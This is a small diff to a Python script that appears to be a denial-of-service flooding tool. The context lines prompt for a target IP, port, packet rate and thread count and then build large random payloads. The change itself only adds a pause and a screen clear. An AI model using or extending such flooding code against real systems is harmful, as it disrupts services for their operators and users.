@@ -66,6 +66,8 @@ ip = str(input('[+] Target: => '))
 port = int(input('[+] Port: => '))
 pack = int(input('[+] Packet/s: => '))
 thread = int(input('[+] Threads: => '))
+time.sleep(3)
+os.system("clear")
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
